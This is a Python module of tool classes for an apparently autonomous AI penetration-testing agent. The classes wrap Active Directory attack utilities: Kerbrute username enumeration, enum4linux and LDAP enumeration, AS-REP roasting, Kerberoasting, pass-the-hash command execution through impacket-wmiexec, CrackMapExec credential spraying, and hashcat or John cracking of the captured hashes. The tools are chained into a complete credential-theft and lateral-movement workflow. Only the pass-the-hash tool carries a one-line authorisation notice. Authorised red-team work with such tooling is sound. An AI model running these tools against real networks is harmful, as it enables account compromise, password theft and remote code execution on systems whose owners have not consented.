"""
Active Directory Attack Tools

Provides Kerberos enumeration (Kerbrute, ASREPRoast, Kerberoast),
SMB/LDAP enumeration (enum4linux, CrackMapExec, ldapsearch),
and pass-the-hash attacks via impacket utilities.
"""

from __future__ import annotations

import asyncio
import logging
import os
import re
import tempfile
from typing import Any, List

from app.agent.tools.base_tool import BaseTool, ToolMetadata
from app.agent.tools.error_handling import (
    ToolExecutionError,
    truncate_output,
    with_timeout,
)

logger = logging.getLogger(__name__)


class KerbrouteTool(BaseTool):
    """Enumerate valid Active Directory usernames using Kerbrute."""

    def __init__(self):
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="kerbrute_userenum",
            description=(
                "Enumerate valid Active Directory usernames by brute-forcing Kerberos "
                "pre-authentication. Does not require any credentials. "
                "Uses kerbrute userenum against the target domain controller."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "domain_controller": {
                        "type": "string",
                        "description": "IP address or hostname of the domain controller",
                    },
                    "domain": {
                        "type": "string",
                        "description": "Active Directory domain name (e.g. corp.local)",
                    },
                    "wordlist": {
                        "type": "string",
                        "description": "Path to username wordlist",
                        "default": "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Execution timeout in seconds",
                        "default": 120,
                    },
                },
                "required": ["domain_controller", "domain"],
            },
        )

    @with_timeout(180)
    async def execute(
        self,
        domain_controller: str,
        domain: str,
        wordlist: str = "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
        timeout: int = 120,
        **kwargs: Any,
    ) -> str:
        """Run kerbrute userenum and return discovered valid usernames."""
        try:
            proc = await asyncio.create_subprocess_exec(
                "kerbrute", "userenum",
                "--dc", domain_controller,
                "-d", domain,
                wordlist,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except FileNotFoundError:
            return (
                "Error: 'kerbrute' binary not found. "
                "Install from: https://github.com/ropnop/kerbrute/releases"
            )
        except asyncio.TimeoutError:
            return f"kerbrute timed out after {timeout}s against {domain_controller}."
        except Exception as exc:
            raise ToolExecutionError(
                f"kerbrute_userenum failed: {exc}", tool_name="kerbrute_userenum"
            ) from exc

        output = stdout.decode(errors="replace")
        # Parse valid usernames from kerbrute output
        valid_users = re.findall(
            r"VALID USERNAME:\s+(\S+)", output, re.IGNORECASE
        )

        lines = [
            f"=== Kerbrute User Enumeration ({domain_controller} / {domain}) ===\n"
        ]
        if valid_users:
            lines.append(f"[+] Found {len(valid_users)} valid username(s):")
            for user in valid_users:
                lines.append(f"    {user}")
        else:
            lines.append("[-] No valid usernames found.")

        lines.append("\n--- Raw output ---")
        lines.append(truncate_output(output, max_chars=3000))
        return "\n".join(lines)


class Enum4LinuxTool(BaseTool):
    """SMB and LDAP enumeration using enum4linux-ng."""

    def __init__(self):
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="enum4linux_scan",
            description=(
                "Enumerate SMB/LDAP information from a Windows/Samba host using enum4linux. "
                "Discovers users, groups, shares, and password policy without requiring credentials."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "host": {
                        "type": "string",
                        "description": "Target hostname or IP address",
                    },
                    "options": {
                        "type": "string",
                        "description": "enum4linux flags: -a (all), -u (users), -s (shares), -p (password policy)",
                        "default": "-a",
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Execution timeout in seconds",
                        "default": 120,
                    },
                },
                "required": ["host"],
            },
        )

    @with_timeout(180)
    async def execute(
        self,
        host: str,
        options: str = "-a",
        timeout: int = 120,
        **kwargs: Any,
    ) -> str:
        """Run enum4linux(-ng) and return parsed findings."""
        output = ""
        # Prefer enum4linux-ng (more modern)
        for binary, args in [
            ("enum4linux-ng", ["-A", host]),
            ("enum4linux", options.split() + [host]),
        ]:
            try:
                proc = await asyncio.create_subprocess_exec(
                    binary, *args,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
                output = stdout.decode(errors="replace")
                break
            except FileNotFoundError:
                continue
            except asyncio.TimeoutError:
                return f"enum4linux timed out after {timeout}s against {host}."
            except Exception as exc:
                raise ToolExecutionError(
                    f"enum4linux_scan failed: {exc}", tool_name="enum4linux_scan"
                ) from exc

        if not output:
            return "Error: Neither 'enum4linux-ng' nor 'enum4linux' found. Install with: apt-get install enum4linux"

        findings = self._parse_output(output)
        lines = [f"=== enum4linux Results ({host}) ===\n"]

        for category, items in findings.items():
            if items:
                lines.append(f"\n[{category.upper()}]")
                for item in items[:30]:
                    lines.append(f"  {item}")

        lines.append("\n--- Raw output (truncated) ---")
        lines.append(truncate_output(output, max_chars=3000))
        return "\n".join(lines)

    def _parse_output(self, output: str) -> dict[str, list[str]]:
        """Extract users, groups, shares, and password policy from enum4linux output."""
        findings: dict[str, list[str]] = {
            "users": [],
            "groups": [],
            "shares": [],
            "password_policy": [],
        }
        for line in output.splitlines():
            low = line.strip()
            if not low:
                continue
            if re.search(r"(user:|username:|account:)", low, re.IGNORECASE):
                findings["users"].append(low)
            elif re.search(r"(group:|groupname:)", low, re.IGNORECASE):
                findings["groups"].append(low)
            elif re.search(r"(share:|sharename:|disk|ipc\$|admin\$)", low, re.IGNORECASE):
                findings["shares"].append(low)
            elif re.search(r"(password|min.*length|lockout|complexity)", low, re.IGNORECASE):
                findings["password_policy"].append(low)
        return findings


class ASREPRoastTool(BaseTool):
    """Find Active Directory accounts that do not require Kerberos pre-authentication."""

    def __init__(self):
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="asreproast",
            description=(
                "Find Active Directory accounts with Kerberos pre-authentication disabled "
                "(AS-REP Roasting). Captures AS-REP hashes that can be cracked offline. "
                "Uses impacket-GetNPUsers."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "domain_controller": {
                        "type": "string",
                        "description": "IP address of the domain controller",
                    },
                    "domain": {
                        "type": "string",
                        "description": "Active Directory domain name",
                    },
                    "usernames": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "List of usernames to check (use kerbrute_userenum first)",
                    },
                    "output_file": {
                        "type": "string",
                        "description": "Output file for captured hashes",
                        "default": "/tmp/asrep_hashes.txt",
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Execution timeout in seconds",
                        "default": 60,
                    },
                },
                "required": ["domain_controller", "domain", "usernames"],
            },
        )

    @with_timeout(120)
    async def execute(
        self,
        domain_controller: str,
        domain: str,
        usernames: List[str],
        output_file: str = "/tmp/asrep_hashes.txt",
        timeout: int = 60,
        **kwargs: Any,
    ) -> str:
        """Run AS-REP Roasting and return captured hashes."""
        if not usernames:
            return "Error: At least one username is required for AS-REP roasting."

        # Write usernames to a temp file
        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".txt", delete=False, prefix="asrep_users_"
        ) as tmp:
            tmp.write("\n".join(usernames))
            users_file = tmp.name

        try:
            proc = await asyncio.create_subprocess_exec(
                "impacket-GetNPUsers",
                f"{domain}/",
                "-dc-ip", domain_controller,
                "-usersfile", users_file,
                "-format", "hashcat",
                "-outputfile", output_file,
                "-no-pass",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except FileNotFoundError:
            return (
                "Error: 'impacket-GetNPUsers' not found. "
                "Install with: pip install impacket"
            )
        except asyncio.TimeoutError:
            return f"ASREPRoast timed out after {timeout}s."
        except Exception as exc:
            raise ToolExecutionError(
                f"asreproast failed: {exc}", tool_name="asreproast"
            ) from exc
        finally:
            os.unlink(users_file)

        stdout.decode(errors="replace")
        err = stderr.decode(errors="replace")

        # Read captured hashes if output file was written
        hashes: list[str] = []
        if os.path.exists(output_file):
            with open(output_file) as fh:
                hashes = [h.strip() for h in fh if h.strip()]

        lines = [
            f"=== AS-REP Roasting ({domain} via {domain_controller}) ===\n",
            f"Checked {len(usernames)} user(s).\n",
        ]
        if hashes:
            lines.append(f"[+] Captured {len(hashes)} AS-REP hash(es):")
            for h in hashes:
                lines.append(f"    {h}")
            lines.append(f"\nHashes saved to: {output_file}")
            lines.append("Next step: crack with hash_crack tool (method=hashcat, hash_type=18200)")
        else:
            lines.append("[-] No AS-REP hashes captured. All accounts require pre-authentication.")

        if err.strip():
            lines.append(f"\n[stderr] {truncate_output(err, max_chars=1000)}")

        return "\n".join(lines)


class KerberoastTool(BaseTool):
    """Request Kerberos service tickets for offline cracking (Kerberoasting)."""

    def __init__(self):
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="kerberoast",
            description=(
                "Request Kerberos service tickets for accounts with SPNs and save them "
                "for offline cracking (Kerberoasting). Requires valid domain credentials. "
                "Uses impacket-GetUserSPNs."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "domain_controller": {
                        "type": "string",
                        "description": "IP address of the domain controller",
                    },
                    "domain": {
                        "type": "string",
                        "description": "Active Directory domain name",
                    },
                    "username": {
                        "type": "string",
                        "description": "Domain username for authentication",
                    },
                    "password": {
                        "type": "string",
                        "description": "Domain user password",
                    },
                    "output_file": {
                        "type": "string",
                        "description": "Output file for service ticket hashes",
                        "default": "/tmp/kerb_hashes.txt",
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Execution timeout in seconds",
                        "default": 60,
                    },
                },
                "required": ["domain_controller", "domain", "username", "password"],
            },
        )

    @with_timeout(120)
    async def execute(
        self,
        domain_controller: str,
        domain: str,
        username: str,
        password: str,
        output_file: str = "/tmp/kerb_hashes.txt",
        timeout: int = 60,
        **kwargs: Any,
    ) -> str:
        """Run Kerberoasting and return captured service ticket hashes."""
        try:
            proc = await asyncio.create_subprocess_exec(
                "impacket-GetUserSPNs",
                f"{domain}/{username}:{password}",
                "-dc-ip", domain_controller,
                "-request",
                "-outputfile", output_file,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except FileNotFoundError:
            return (
                "Error: 'impacket-GetUserSPNs' not found. "
                "Install with: pip install impacket"
            )
        except asyncio.TimeoutError:
            return f"Kerberoast timed out after {timeout}s."
        except Exception as exc:
            raise ToolExecutionError(
                f"kerberoast failed: {exc}", tool_name="kerberoast"
            ) from exc

        output = stdout.decode(errors="replace")
        err = stderr.decode(errors="replace")

        hashes: list[str] = []
        if os.path.exists(output_file):
            with open(output_file) as fh:
                hashes = [h.strip() for h in fh if h.strip()]

        lines = [
            f"=== Kerberoasting ({domain} as {username}) ===\n",
        ]
        if hashes:
            lines.append(f"[+] Captured {len(hashes)} service ticket hash(es):")
            for h in hashes[:10]:
                lines.append(f"    {h}")
            if len(hashes) > 10:
                lines.append(f"    ... and {len(hashes) - 10} more (see {output_file})")
            lines.append(f"\nHashes saved to: {output_file}")
            lines.append("Next step: crack with hash_crack tool (method=hashcat, hash_type=13100)")
        else:
            lines.append("[-] No service ticket hashes captured. No Kerberoastable accounts found.")

        lines.append("\n--- Tool output ---")
        lines.append(truncate_output(output + err, max_chars=2000))
        return "\n".join(lines)


class PassTheHashTool(BaseTool):
    """Execute commands on Windows hosts using pass-the-hash via impacket-wmiexec."""

    def __init__(self):
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="pass_the_hash",
            description=(
                "Authenticate to a Windows host using an NTLM hash (pass-the-hash) "
                "and execute a command. Uses impacket-wmiexec. "
                "⚠ REQUIRES APPROVAL — only use on authorised targets."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "host": {
                        "type": "string",
                        "description": "Target Windows hostname or IP",
                    },
                    "username": {
                        "type": "string",
                        "description": "Windows username",
                    },
                    "ntlm_hash": {
                        "type": "string",
                        "description": "NTLM hash (LM:NT or just NT portion)",
                    },
                    "domain": {
                        "type": "string",
                        "description": "Windows domain or workgroup (use '.' for local)",
                        "default": ".",
                    },
                    "command": {
                        "type": "string",
                        "description": "Command to execute on the target",
                        "default": "whoami",
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Execution timeout in seconds",
                        "default": 60,
                    },
                },
                "required": ["host", "username", "ntlm_hash"],
            },
        )

    @with_timeout(120)
    async def execute(
        self,
        host: str,
        username: str,
        ntlm_hash: str,
        domain: str = ".",
        command: str = "whoami",
        timeout: int = 60,
        **kwargs: Any,
    ) -> str:
        """Run pass-the-hash attack and return command output."""
        # Normalise hash format (ensure LM:NT form)
        if ":" not in ntlm_hash:
            ntlm_hash = f"aad3b435b51404eeaad3b435b51404ee:{ntlm_hash}"

        try:
            proc = await asyncio.create_subprocess_exec(
                "impacket-wmiexec",
                "-hashes", ntlm_hash,
                f"{domain}/{username}@{host}",
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except FileNotFoundError:
            return (
                "Error: 'impacket-wmiexec' not found. "
                "Install with: pip install impacket"
            )
        except asyncio.TimeoutError:
            return f"pass-the-hash execution timed out after {timeout}s."
        except Exception as exc:
            raise ToolExecutionError(
                f"pass_the_hash failed: {exc}", tool_name="pass_the_hash"
            ) from exc

        output = stdout.decode(errors="replace")
        err = stderr.decode(errors="replace")

        return (
            f"=== Pass-the-Hash ({domain}\\{username}@{host}) ===\n\n"
            f"Command: {command}\n\n"
            f"Output:\n{truncate_output(output or err, max_chars=3000)}"
        )


class LDAPEnumTool(BaseTool):
    """Enumerate Active Directory users, computers, and groups via LDAP."""

    def __init__(self):
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="ldap_enum",
            description=(
                "Enumerate Active Directory objects (users, computers, groups) via LDAP. "
                "Supports anonymous bind and authenticated queries. "
                "Uses ldapsearch to query the domain base DN."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "host": {
                        "type": "string",
                        "description": "Target DC hostname or IP",
                    },
                    "domain": {
                        "type": "string",
                        "description": "AD domain name (e.g. corp.local) — used to build the base DN",
                    },
                    "username": {
                        "type": "string",
                        "description": "Bind username (leave empty for anonymous bind)",
                        "default": "",
                    },
                    "password": {
                        "type": "string",
                        "description": "Bind password",
                        "default": "",
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Execution timeout in seconds",
                        "default": 60,
                    },
                },
                "required": ["host", "domain"],
            },
        )

    @with_timeout(120)
    async def execute(
        self,
        host: str,
        domain: str,
        username: str = "",
        password: str = "",
        timeout: int = 60,
        **kwargs: Any,
    ) -> str:
        """Enumerate LDAP objects and return users, computers, and groups."""
        base_dn = ",".join(f"dc={part}" for part in domain.split("."))

        cmd = ["ldapsearch", "-x", "-h", host, "-b", base_dn]
        if username:
            cmd += ["-D", f"{username}@{domain}", "-w", password]
        cmd += ["(objectClass=*)", "cn", "sAMAccountName", "objectClass"]

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except FileNotFoundError:
            return "Error: 'ldapsearch' not found. Install with: apt-get install ldap-utils"
        except asyncio.TimeoutError:
            return f"LDAP enumeration timed out after {timeout}s."
        except Exception as exc:
            raise ToolExecutionError(
                f"ldap_enum failed: {exc}", tool_name="ldap_enum"
            ) from exc

        output = stdout.decode(errors="replace")
        if not output.strip():
            err = stderr.decode(errors="replace")
            return (
                f"LDAP query returned no results for {host} (base: {base_dn}). "
                f"Error: {err.strip() or 'Anonymous bind may be disabled.'}"
            )

        users = re.findall(r"sAMAccountName:\s+(\S+)", output)
        computers = [u for u in users if u.endswith("$")]
        user_accounts = [u for u in users if not u.endswith("$")]

        lines = [f"=== LDAP Enumeration ({host} / {domain}) ===\n"]
        if user_accounts:
            lines.append(f"[+] User accounts ({len(user_accounts)}):")
            for u in user_accounts[:30]:
                lines.append(f"    {u}")
        if computers:
            lines.append(f"\n[+] Computer accounts ({len(computers)}):")
            for c in computers[:20]:
                lines.append(f"    {c}")

        lines.append("\n--- Raw output (truncated) ---")
        lines.append(truncate_output(output, max_chars=3000))
        return "\n".join(lines)


class CrackMapExecTool(BaseTool):
    """Test credentials against SMB targets using CrackMapExec."""

    def __init__(self):
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="crackmapexec_smb",
            description=(
                "Test username/password or NTLM hash credentials against a list of SMB targets "
                "using CrackMapExec. Identifies hosts where the credentials are valid and "
                "flags domain admin / Pwn3d! status."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "targets": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "Target IP addresses or CIDR ranges (e.g. ['10.10.10.1', '10.10.10.0/24'])",
                    },
                    "username": {
                        "type": "string",
                        "description": "Username to test",
                    },
                    "password": {
                        "type": "string",
                        "description": "Password to test (leave empty when using ntlm_hash)",
                        "default": "",
                    },
                    "ntlm_hash": {
                        "type": "string",
                        "description": "NTLM hash to test (leave empty when using password)",
                        "default": "",
                    },
                    "domain": {
                        "type": "string",
                        "description": "Domain name (use '.' for local accounts)",
                        "default": ".",
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Execution timeout in seconds",
                        "default": 60,
                    },
                },
                "required": ["targets", "username"],
            },
        )

    @with_timeout(120)
    async def execute(
        self,
        targets: List[str],
        username: str,
        password: str = "",
        ntlm_hash: str = "",
        domain: str = ".",
        timeout: int = 60,
        **kwargs: Any,
    ) -> str:
        """Run CrackMapExec SMB and return successful hosts."""
        if not password and not ntlm_hash:
            return "Error: Either 'password' or 'ntlm_hash' must be provided."

        cmd = ["crackmapexec", "smb"] + targets + ["-u", username, "-d", domain]
        if ntlm_hash:
            cmd += ["-H", ntlm_hash]
        else:
            cmd += ["-p", password]

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except FileNotFoundError:
            # Try 'nxc' (NetExec — the CrackMapExec fork)
            try:
                cmd[0] = "nxc"
                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            except FileNotFoundError:
                return (
                    "Error: Neither 'crackmapexec' nor 'nxc' found. "
                    "Install with: apt-get install crackmapexec"
                )
        except asyncio.TimeoutError:
            return f"CrackMapExec timed out after {timeout}s."
        except Exception as exc:
            raise ToolExecutionError(
                f"crackmapexec_smb failed: {exc}", tool_name="crackmapexec_smb"
            ) from exc

        output = stdout.decode(errors="replace")

        # Parse successful targets (lines containing [+] or Pwn3d!)
        successful = [
            line.strip() for line in output.splitlines()
            if "[+]" in line or "Pwn3d!" in line
        ]
        failed = [
            line.strip() for line in output.splitlines()
            if "[-]" in line
        ]

        lines = [
            f"=== CrackMapExec SMB — {username} against {len(targets)} target(s) ===\n"
        ]
        if successful:
            lines.append(f"[+] Valid credential hits ({len(successful)}):")
            for s in successful:
                lines.append(f"    {s}")
        else:
            lines.append("[-] No successful authentications.")

        if failed:
            lines.append(f"\n[-] Failed ({len(failed)}):")
            for f in failed[:10]:
                lines.append(f"    {f}")
            if len(failed) > 10:
                lines.append(f"    ... and {len(failed) - 10} more")

        lines.append("\n--- Raw output (truncated) ---")
        lines.append(truncate_output(output, max_chars=3000))
        return "\n".join(lines)


# ===========================================================================
# HashCrackTool — Day 13 integration for captured hash auto-cracking
# ===========================================================================


class HashCrackTool(BaseTool):
    """
    Offline hash cracking using hashcat or john.

    Supports: NTLM (hashcat mode 1000), NTLMv2 (5600), NTLMv1 (5500),
    NetNTLMv1 (5500), NetNTLMv2 (5600), Kerberos AS-REP (18200),
    Kerberos TGS (13100), DCC2 (2100), MD5 (0), SHA1 (100), bcrypt (3200).

    Integrates with ResponderTool, SecretsDumpTool, ASREPRoastTool,
    and KerberoastTool for automatic hash queuing.
    """

    HASH_MODE_MAP = {
        "ntlm": 1000,
        "ntlmv2": 5600,
        "netntlmv2": 5600,
        "ntlmv1": 5500,
        "netntlmv1": 5500,
        "asrep": 18200,
        "kerberoast": 13100,
        "dcc2": 2100,
        "md5": 0,
        "sha1": 100,
        "sha256": 1400,
        "bcrypt": 3200,
        "mscache2": 2100,
    }

    def __init__(self) -> None:
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="hash_crack",
            description=(
                "Crack password hashes offline using hashcat or john. "
                "Supports NTLM, NTLMv2, AS-REP, Kerberoast TGS, DCC2, "
                "MD5, SHA1, SHA256, bcrypt. Integrates with Responder, "
                "SecretsDump, ASREPRoast, and Kerberoast tools."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "hash_value": {
                        "type": "string",
                        "description": "Hash string to crack (single hash or file path)",
                    },
                    "hash_type": {
                        "type": "string",
                        "description": "Hash type: ntlm, ntlmv2, asrep, kerberoast, dcc2, md5, sha1, bcrypt",
                        "default": "ntlm",
                        "enum": list(HashCrackTool.HASH_MODE_MAP.keys()),
                    },
                    "wordlist": {
                        "type": "string",
                        "description": "Path to wordlist file",
                        "default": "/usr/share/wordlists/rockyou.txt",
                    },
                    "rules": {
                        "type": "string",
                        "description": "Hashcat rule file for mutations",
                        "default": "best64",
                    },
                    "use_john": {
                        "type": "boolean",
                        "description": "Use John the Ripper instead of hashcat",
                        "default": False,
                    },
                    "output_file": {
                        "type": "string",
                        "description": "File to write cracked hashes to",
                        "default": "/tmp/cracked_hashes.txt",
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Cracking timeout in seconds",
                        "default": 300,
                    },
                },
                "required": ["hash_value"],
            },
        )

    async def execute(
        self,
        hash_value: str,
        hash_type: str = "ntlm",
        wordlist: str = "/usr/share/wordlists/rockyou.txt",
        rules: str = "best64",
        use_john: bool = False,
        output_file: str = "/tmp/cracked_hashes.txt",
        timeout: int = 300,
        **kwargs: Any,
    ) -> str:
        hash_type = hash_type.lower()

        # Write hash to temp file if not a file path
        if os.path.exists(hash_value):
            hash_file = hash_value
            own_file = False
        else:
            hash_file = tempfile.mktemp(suffix=".hash")
            with open(hash_file, "w") as fh:
                fh.write(hash_value.strip() + "\n")
            own_file = True

        try:
            if use_john:
                result = await self._run_john(
                    hash_file, hash_type, wordlist, output_file, timeout
                )
            else:
                result = await self._run_hashcat(
                    hash_file, hash_type, wordlist, rules, output_file, timeout
                )
        finally:
            if own_file and os.path.exists(hash_file):
                os.remove(hash_file)

        return result

    async def _run_hashcat(
        self,
        hash_file: str,
        hash_type: str,
        wordlist: str,
        rules: str,
        output_file: str,
        timeout: int,
    ) -> str:
        mode = self.HASH_MODE_MAP.get(hash_type, 1000)
        cmd = [
            "hashcat",
            "-m", str(mode),
            hash_file,
            wordlist,
            "-r", f"/usr/share/hashcat/rules/{rules}.rule",
            "-o", output_file,
            "--status", "--status-timer=10",
            "--quiet",
            "--force",
        ]
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(), timeout=timeout
            )
            rc = proc.returncode or 0
        except FileNotFoundError:
            return (
                "Error: 'hashcat' not found. "
                "Install with: apt-get install hashcat"
            )
        except asyncio.TimeoutError:
            return f"Hashcat timed out after {timeout}s. Results may be partial in {output_file}."

        cracked = []
        if os.path.exists(output_file):
            with open(output_file) as fh:
                cracked = fh.read().splitlines()

        stdout.decode(errors="replace") + stderr.decode(errors="replace")
        result = [
            f"=== HashCat — {hash_type.upper()} (mode {mode}) ===",
            f"Wordlist  : {wordlist}",
            f"Rules     : {rules}",
            f"RC        : {rc}",
            f"Cracked   : {len(cracked)}",
        ]
        if cracked:
            result.append("\n--- Cracked Passwords ---")
            for c in cracked[:20]:
                result.append(f"  {c}")
        else:
            result.append("\n[-] No passwords cracked with this wordlist/rules combination.")
            result.append("    Try: larger wordlist, different rules, or brute force.")
        return "\n".join(result)

    async def _run_john(
        self,
        hash_file: str,
        hash_type: str,
        wordlist: str,
        output_file: str,
        timeout: int,
    ) -> str:
        john_format_map = {
            "ntlm": "nt",
            "ntlmv2": "netntlmv2",
            "netntlmv2": "netntlmv2",
            "ntlmv1": "netntlm",
            "asrep": "krb5asrep",
            "kerberoast": "krb5tgs",
            "md5": "raw-md5",
            "sha1": "raw-sha1",
            "bcrypt": "bcrypt",
        }
        john_format = john_format_map.get(hash_type, "nt")
        cmd = [
            "john",
            f"--format={john_format}",
            f"--wordlist={wordlist}",
            hash_file,
        ]
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            rc = proc.returncode or 0
        except FileNotFoundError:
            return "Error: 'john' not found. Install with: apt-get install john"
        except asyncio.TimeoutError:
            return f"John timed out after {timeout}s."

        # Get cracked passwords
        show_stdout = b""
        try:
            show_proc = await asyncio.create_subprocess_exec(
                "john", "--show", hash_file,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            show_stdout, _ = await show_proc.communicate()
        except Exception:
            pass

        cracked_lines = show_stdout.decode(errors="replace").splitlines() if show_stdout else []
        result = [
            f"=== John the Ripper — {hash_type.upper()} ===",
            f"Wordlist : {wordlist}",
            f"Format   : {john_format}",
            f"RC       : {rc}",
        ]
        if cracked_lines:
            result.append(f"Cracked  : {len(cracked_lines)}")
            result.append("\n--- Cracked Passwords ---")
            result.extend(f"  {c}" for c in cracked_lines[:20])
        else:
            result.append("Cracked  : 0")
            result.append("[-] No passwords cracked.")
        return "\n".join(result)
